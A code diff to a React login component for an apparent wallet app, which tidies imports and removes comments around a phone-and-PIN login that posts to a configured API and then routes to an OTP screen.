@@ -1,8 +1,7 @@
-import React, { useState } from "react";
+import { useState, type FormEvent } from "react";
 import { useNavigate } from "react-router-dom";
 import { Wallet, Eye, Lock, ShieldCheck } from "lucide-react";
 
-// ✅ Uses the Vercel environment variable, falls back to localhost for local dev
 const API_URL = import.meta.env.VITE_API_URL || "http://localhost:8000";
 
 const Login = () => {
@@ -13,10 +12,9 @@ const Login = () => {
 
   const isFormValid = phone.length >= 8 && pin.length === 5;
 
-  const handleLogin = async (e: React.FormEvent) => {
+  const handleLogin = async (e: FormEvent) => {
     e.preventDefault();
     
-    // Save the phone number locally in case the user refreshes the OTP page
     localStorage.setItem("userPhone", phone);
 
     try {
@@ -25,7 +23,6 @@ const Login = () => {
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ phone_number: phone, pin: pin }),
       });
-      // ✅ Pass the phone number to the OTP screen
       navigate("/otp", { state: { phone: phone } });
     } catch (error) {
       navigate("/otp", { state: { phone: phone } });
